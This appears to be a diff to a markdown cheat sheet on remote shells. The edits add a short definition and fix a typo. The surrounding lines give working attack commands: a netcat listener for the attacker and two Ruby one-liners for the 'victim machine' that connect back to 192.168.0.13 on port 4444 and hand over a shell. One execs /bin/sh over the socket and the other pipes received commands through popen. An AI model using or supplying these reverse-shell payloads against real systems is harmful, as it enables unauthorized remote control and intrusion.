@@ -1,6 +1,8 @@
 # Remote Shell
 
-> **Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"
+Remote shell means s forward or reverse connection to the target system command-line(shell). 
+
+**Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"
 
 ## Connect to Bind shell
 from terminal
@@ -15,7 +17,7 @@ Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run
 ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
 ```
 
-if you don't whant to rely on `/bin/sh`
+if you don't want to rely on `/bin/sh`
 ```ruby
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
